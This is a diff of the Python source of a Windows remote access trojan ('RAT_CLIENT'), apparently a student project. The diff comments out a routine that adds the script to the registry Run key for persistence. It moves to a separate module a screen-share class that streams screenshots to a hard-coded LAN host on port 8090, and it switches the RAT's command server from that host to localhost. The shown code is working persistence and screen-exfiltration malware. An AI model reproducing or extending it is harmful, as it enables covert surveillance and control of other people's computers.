@@ -16,6 +16,7 @@ import struct
 import io
 import time
 import winreg as reg
+from modules.screenshare import ScreenShare
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -30,87 +31,34 @@ FILE_SHARE_READ = 1
 FILE_SHARE_DELETE = 4
 CREATE_ALWAYS = 2
 
-def AddToRegistry():
- 
-    # in python __file__ is the instant of
-    # file path where it was executed
-    # so if it was executed from desktop,
-    # then __file__ will be
-    # c:\users\current_user\desktop
-    pth = os.path.dirname(os.path.realpath(__file__))
-     
-    # name of the python file with extension
-    s_name="mYscript.py"    
-     
-    # joins the file name to end of path address
-    address=os.join(pth,s_name)
-     
-    # key we want to change is HKEY_CURRENT_USER
-    # key value is Software\Microsoft\Windows\CurrentVersion\Run
-    key = HKEY_CURRENT_USER
-    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
-     
-    # open the key to make changes to
-    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
-     
-    # modify the opened key
-    reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
-     
-    # now close the opened key
-    reg.CloseKey(open)
+# def AddToRegistry():
 
+#     # in python __file__ is the instant of
+#     # file path where it was executed
+#     # so if it was executed from desktop,
+#     # then __file__ will be
+#     # c:\users\current_user\desktop
+#     pth = os.path.dirname(os.path.realpath(__file__))
 
-class ScreenShare():
-    def __init__(self):
-        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.host = "192.168.98.223"
-        self.port = 8090
+#     # name of the python file with extension
+#     s_name="mYscript.py"
 
-        # The cooldown between each screenshot (in seconds) equals to 1/0.01 = 100 FPS
-        self.cooldown = 0.05
+#     # joins the file name to end of path address
+#     address=os.join(pth,s_name)
 
-    def start_screenshare(self):
-        self.s.connect((self.host, self.port))
-        self.connected = True
-        print("[*] Connected to server")
+#     # key we want to change is HKEY_CURRENT_USER
+#     # key value is Software\Microsoft\Windows\CurrentVersion\Run
+#     key = HKEY_CURRENT_USER
+#     key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
 
-        while True:
-            try:
-                print("Trying to send image")
-                # Get the image
-                img = self.get_screenshot()
+#     # open the key to make changes to
+#     open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
 
-                self.s.sendall(img)
+#     # modify the opened key
+#     reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
 
-                # Introduce a cooldown (in seconds) before sending the next screenshot
-                time.sleep(self.cooldown)
-
-            except Exception as e:
-                print(f"Error sending image: {str(e)}")
-                self.connected = False
-                break
-
-    def get_screenshot(self):
-        # Get the image, then make it into raw material, then send it to the server
-        img = ImageGrab.grab()
-
-        # Save the image to a file
-        img.save("image.png")
-
-        # Open the image
-        file = open("image.png", "rb")
-
-        data = file.read()
-        # Close the file
-        file.close()
-        # Remove the file
-        os.remove("image.png")
-
-        return data
-
-    def stop_screenshare(self):
-        self.connected = False
-        self.s.close()
+#     # now close the opened key
+#     reg.CloseKey(open)
 
 
 class RAT_CLIENT:
@@ -190,7 +138,8 @@ class RAT_CLIENT:
 
 
 if __name__ == '__main__':
-    rat = RAT_CLIENT('192.168.98.223', 4444)
+    # for school: 192.168.98.223
+    rat = RAT_CLIENT('localhost', 4444)
 
     while True:
         try:
